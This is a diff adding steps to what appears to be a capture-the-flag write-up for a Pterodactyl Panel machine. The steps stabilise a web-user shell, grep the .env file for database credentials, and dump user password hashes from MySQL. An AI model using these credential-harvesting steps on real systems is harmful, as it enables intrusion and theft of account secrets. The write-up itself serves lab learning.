@@ -258,7 +258,51 @@ wwwrun@pterodactyl:/var/www/pterodactyl/public> id
 id
 uid=474(wwwrun) gid=477(www) groups=477(www)
 ```
+We then use the following commands to stabilize the shell:
 
+```bash
+python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
+export TERM=xterm
+ctrl-z
+stty raw -echo; fg
+```
 
 ## wwwrun -> phileasfogg3
 
+The first thing we should do is identify any files related to the Pterodactyl Panel application. This search brings us to a .env environment file:
+
+#### Extract creds with grep:
+
+```
+grep -i 'port\|database\|username\|password' /var/www/pterodactyl/.env
+```
+
+#### Output:
+
+```
+DB_PORT=3306
+DB_DATABASE=panel
+DB_USERNAME=pterodactyl
+DB_PASSWORD=PteraPanel
+```
+
+Now we log into MySQL and collect credentials from the panel database:
+
+#### Extracting creds from MySQL:
+
+```
+mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel -D panel
+use panel;
+select username,password from users;
+```
+
+#### Output:
+
+```
++--------------+--------------------------------------------------------------+
+| username     | password                                                     |
++--------------+--------------------------------------------------------------+
+| headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
+| phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
++--------------+--------------------------------------------------------------+
+```
